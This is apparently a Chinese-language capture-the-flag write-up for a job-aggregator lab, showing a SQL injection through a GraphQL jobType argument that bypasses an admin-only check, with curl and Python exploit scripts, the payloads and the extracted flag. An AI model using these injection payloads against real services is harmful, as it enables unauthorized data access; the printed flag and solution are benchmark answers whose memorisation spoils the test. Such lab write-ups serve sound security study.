## 题解

### 入口与指纹

`uvicorn`（FastAPI + Strawberry/类似 GraphQL 实现），页面标题 `Ultimate Job Aggregator`，
与 `xben-006-24` 是同一套界面，但**接口从 REST 换成了 GraphQL**：

```javascript
const query = `
    query {
        jobs(jobType: "${jobType}") {
            id  name  type  description
        }
    }
`;
fetch('/graphql/', { method:'POST', headers:{'Content-Type':'application/json'},
                     body: JSON.stringify({ query }) });
```

前端把下拉框的值**直接拼进 GraphQL 查询字符串**（字符串插值），这是第一个可疑点。

`/openapi.json` 不存在（这是 GraphQL 服务），可用端点只有 `POST /graphql/`。

### 关键观察

**1. 未认证时可列出非私有岗位，且 ID 有缺口。**

```graphql
query { jobs(jobType: "") { id name type description } }
```

```json
{"data":{"jobs":[
  {"id":1,"name":"Senior Frontend Dev","type":"front-end"},
  {"id":2,"name":"Staff Backend Python","type":"back-end"},
  {"id":4,"name":"Frontend Dev","type":"front-end"}]}}
```

**缺 `id=3`** —— 正是那个 `private` 岗位。

**2. `private` 被一条字符串比较挡住。**

```graphql
query { jobs(jobType: "private") { id } }
# {"data":null,"errors":[{"message":"Only admins can see private jobs"}]}
```

**3. 但 `jobType` 最终被拼进 SQL —— 而且引号能逃出 GraphQL 字符串。**

GraphQL 允许 `\"` 转义，所以可以用 `private'--` 这类内容：

```graphql
query { jobs(jobType: "private'--") { id name type description } }
```

```json
{"data":{"jobs":[{"id":3,"name":"Hidden job","type":"private",
  "description":"flag{2d6dab2a-f744-48a1-8351-d43cebfbf5c5}"}]}}
```

机制与 `xben-006-24` 完全一致：鉴权看的是 `job_type == "private"` 这个**字符串**，
查询用的是**拼接**。`private'--` 不等于 `private`（放行），拼进 SQL 后变成
`WHERE type = 'private'--'`（命中）。

`x' OR 1=1--` 也能返回全部岗位（包括 id=3）。

### 利用链

```bash
T=$(head -1 .target)

curl -sS -H 'Content-Type: application/json' \
  --data-binary '{"query":"query { jobs(jobType: \"private'"'"'--\") { id name type description } }"}' \
  "http://$T/graphql/" \
| python3 -c 'import json,sys; print(json.load(sys.stdin)["data"]["jobs"][0]["description"])'
```

为了少踩引号转义的坑，用 Python 直接构造：

```python
import json, urllib.request
payload = {"query": 'query { jobs(jobType: "private\'--") { id name type description } }'}
req = urllib.request.Request("http://$T/graphql/",
        data=json.dumps(payload).encode(),
        headers={"Content-Type": "application/json"})
print(urllib.request.urlopen(req).read().decode())
```

### flag 位置

`/graphql/` 响应里 id=3（`Hidden job`）的 `description` 字段。

## 复盘

- **界面相同、协议不同。** 026 与 038 是同一套 UI，但一个走 REST `/jobs`、一个走
  `/graphql/`；先读页面里的 `fetch(...)` 才能确定打哪里。**不要照搬上一题的路径。**
- **GraphQL 的字符串参数同样可以注入。** 关键在于后端把参数拼进 SQL
  （check-vs-use），而 GraphQL 层的转义 `\"` 恰好让 `'`、`--` 原样通过。
  判据：把 `private` 换成 `private'--`，若不再报 "Only admins" 却能返回数据，就是它。
- **`id` 缺口仍是最快的线索。** `1,2,4` 缺 `3`，直接指向被隐藏的那条。
- **`OR 1=1` 也能用，但 `--` 更稳。** 前者会把所有行都返回（噪音大），
  后者精确命中 private 那一条。
